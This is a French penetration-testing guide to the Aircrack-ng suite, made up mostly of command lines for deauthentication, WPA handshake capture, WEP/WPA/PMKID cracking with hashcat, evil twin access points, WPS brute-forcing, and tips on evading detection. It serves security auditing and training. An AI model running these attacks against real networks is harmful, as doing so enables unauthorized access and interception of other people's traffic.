# Aircrack-ng - Suite d'Audit WiFi

## 🗂️ Workflow d'audit WiFi avec Aircrack-ng
1. Préparation de l'interface et mode monitor
   ↓
2. Découverte et reconnaissance des réseaux WiFi
   ↓
3. Capture du trafic et handshakes WPA
   ↓
4. Attaques par déauthentification si nécessaire
   ↓
5. Crackage des clés WEP/WPA/WPA2
   ↓
6. Validation et documentation des résultats

## 📋 Vue d'ensemble

Aircrack-ng est la suite d'outils de référence pour l'audit des réseaux WiFi. Elle permet la capture, l'analyse et le crackage des protocoles de sécurité sans fil WEP, WPA et WPA2/WPA3.

> **💡 Explication Simple** : C'est comme une boîte à outils complète pour tester la sécurité des réseaux WiFi, capable d'écouter, analyser et casser les mots de passe des réseaux sans fil.

## ⚡ Préparation et Configuration

### Installation
```bash
# Ubuntu/Debian
sudo apt update && sudo apt install aircrack-ng

# Arch Linux
sudo pacman -S aircrack-ng

# Compilation depuis source
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
make && sudo make install
```

### Configuration interface
```bash
# Identifier les interfaces WiFi
iwconfig
ip link show

# Activation mode monitor
sudo airmon-ng start wlan0

# Vérification mode monitor
iwconfig
# Interface devrait être wlan0mon ou similar

# Kill processus interférents
sudo airmon-ng check kill
```

## 🔍 Reconnaissance et Découverte

### Scan des réseaux disponibles
```bash
# Scan passif des réseaux
sudo airodump-ng wlan0mon

# Scan sur canal spécifique
sudo airodump-ng -c 6 wlan0mon

# Scan avec filtrage par BSSID
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Export en fichier
sudo airodump-ng -w scan_results wlan0mon
```

### Analyse détaillée
```bash
# Scan avec informations étendues
sudo airodump-ng --manufacturer wlan0mon

# Scan sur bande 5GHz
sudo airodump-ng --band a wlan0mon

# Scan toutes les bandes
sudo airodump-ng --band abg wlan0mon
```

## 🎯 Capture WPA Handshake

### Capture passive
```bash
# Capture handshake sur réseau spécifique
sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w handshake wlan0mon

# Capture avec filtrage par client
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### Déauthentification pour forcer handshake
```bash
# Déauth tous les clients
sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] wlan0mon

# Déauth client spécifique
sudo aireplay-ng --deauth 5 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon

# Déauth continue
sudo aireplay-ng --deauth 0 -a [TARGET_BSSID] wlan0mon
```

### Validation du handshake
```bash
# Vérifier la capture du handshake
aircrack-ng handshake-01.cap

# Analyse avec Wireshark
wireshark handshake-01.cap
```

## 🔐 Crackage WPA/WPA2

### Attaque par dictionnaire
```bash
# Crackage avec dictionnaire simple
aircrack-ng -w wordlist.txt handshake-01.cap

# Avec BSSID spécifique
aircrack-ng -w rockyou.txt -b [TARGET_BSSID] handshake-01.cap

# Dictionnaire multiple
aircrack-ng -w wordlist1.txt,wordlist2.txt handshake-01.cap
```

### Génération de dictionnaires
```bash
# Crunch pour génération de mots de passe
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Avec patterns spécifiques
crunch 8 8 -t @@@@@@%% -o wordlist.txt

# Hashcat rules
hashcat --stdout -r rules/best64.rule rockyou.txt > custom_wordlist.txt
```

### Optimisation GPU avec Hashcat
```bash
# Conversion cap vers hccapx
cap2hccapx.py handshake-01.cap handshake.hccapx

# Crackage GPU
hashcat -m 2500 handshake.hccapx rockyou.txt

# Avec règles
hashcat -m 2500 handshake.hccapx rockyou.txt -r rules/best64.rule

# Attaque par masque
hashcat -m 2500 handshake.hccapx -a 3 ?d?d?d?d?d?d?d?d
```

## 🔓 Attaques WEP (Legacy)

### Capture IVs pour WEP
```bash
# Capture trafic WEP
sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w wep_capture wlan0mon

# Injection pour augmenter IVs
sudo aireplay-ng --arpreplay -b [TARGET_BSSID] -h [CLIENT_MAC] wlan0mon

# Fake authentication
sudo aireplay-ng --fakeauth 0 -a [TARGET_BSSID] -h [YOUR_MAC] wlan0mon
```

### Crackage WEP
```bash
# Crackage automatique
aircrack-ng wep_capture-01.cap

# Avec plus de 40-bit keys
aircrack-ng -n 64 wep_capture-01.cap

# Force 128-bit
aircrack-ng -n 128 wep_capture-01.cap
```

## 🎭 Techniques d'Attaque Avancées

### Evil Twin Attack
```bash
# Création faux AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Avec captive portal
sudo airbase-ng -e "Hotel_WiFi" -c 6 -P wlan0mon

# Bridge vers internet
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### WPS Attacks
```bash
# Scan WPS enabled
wash -i wlan0mon

# Reaver WPS attack
reaver -i wlan0mon -b [TARGET_BSSID] -vv

# Pixie dust attack
reaver -i wlan0mon -b [TARGET_BSSID] -K -vv

# Bully alternative
bully -b [TARGET_BSSID] -c [CHANNEL] wlan0mon
```

### PMKID Attack (WPA3)
```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Conversion pour hashcat
hcxpcaptool -z pmkid.hash pmkid.pcapng

# Crackage PMKID
hashcat -m 16800 pmkid.hash rockyou.txt
```

## 📊 Analyse et Post-Traitement

### Analyse des captures
```bash
# Statistiques détaillées
aircrack-ng -S handshake-01.cap

# Extraction informations
airdecap-ng -e "TargetNetwork" -p "password" handshake-01.cap

# Analyse avec tshark
tshark -r handshake-01.cap -Y "wlan.fc.type_subtype == 0x08"
```

### Génération de rapports
```bash
# Export CSV
airodump-ng --output-format csv wlan0mon

# Parse avec script
python3 parse_airodump.py scan_results-01.csv

# Génération rapport HTML
aircrack-ng -H report.html handshake-01.cap
```

## 🛡️ Conseils OPSEC

### Discrétion
- Utiliser des interfaces USB WiFi dédiées aux tests
- Éviter les déauthentifications massives en production
- Limiter la durée des tests pour réduire la détection
- Masquer l'adresse MAC avec macchanger

### Legal compliance
```bash
# Documentation légale
echo "Test autorisé le $(date) par [AUTORISATION]" > test_log.txt

# Limitation géographique
# Tester uniquement les réseaux autorisés

# Sauvegarde evidence
cp handshake-01.cap evidence/$(date +%Y%m%d)_handshake.cap
```

## ⚠️ Erreurs fréquentes

### Configuration
- Oublier d'activer le mode monitor correctement
- Ne pas kill les processus NetworkManager interférents
- Utiliser de mauvais drivers WiFi pour injection
- Négliger la configuration des canaux

### Capture
- Arrêter la capture trop tôt (handshake incomplet)
- Ne pas vérifier la qualité du signal
- Oublier de sauvegarder les captures importantes
- Mélanger captures WEP et WPA

## 💡 Astuces

### Optimisation capture
- Utiliser des antennes directionnelles pour cibler
- Se positionner proche du point d'accès
- Capturer sur canal le moins encombré
- Utiliser plusieurs interfaces simultanément

### Accélération crackage
```bash
# Distributed cracking
aircrack-ng -w wordlist.txt handshake.cap -J hash
john --wordlist=rockyou.txt hash.john

# Cloud cracking
# Upload vers services de crackage cloud

# GPU optimization
export CUDA_VISIBLE_DEVICES=0,1
hashcat -m 2500 -O handshake.hccapx rockyou.txt
```

## 🔗 Pour aller plus loin

- [Aircrack-ng Documentation](https://aircrack-ng.org/)
- [WiFi Security Guide](https://github.com/aircrack-ng/aircrack-ng/wiki)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [OWASP WiFi Security](https://owasp.org/www-project-iot-security-testing-guide/)

## 🧭 Navigation

- [Guide WiFi Pumpkin](./WiFi-Pumpkin.md)
- [Guide Kismet](./Kismet.md)
- [Audit WiFi complet](../WiFi/WiFi-Auditing-Complete.md)
- [Retour aux outils wireless](./README.md) 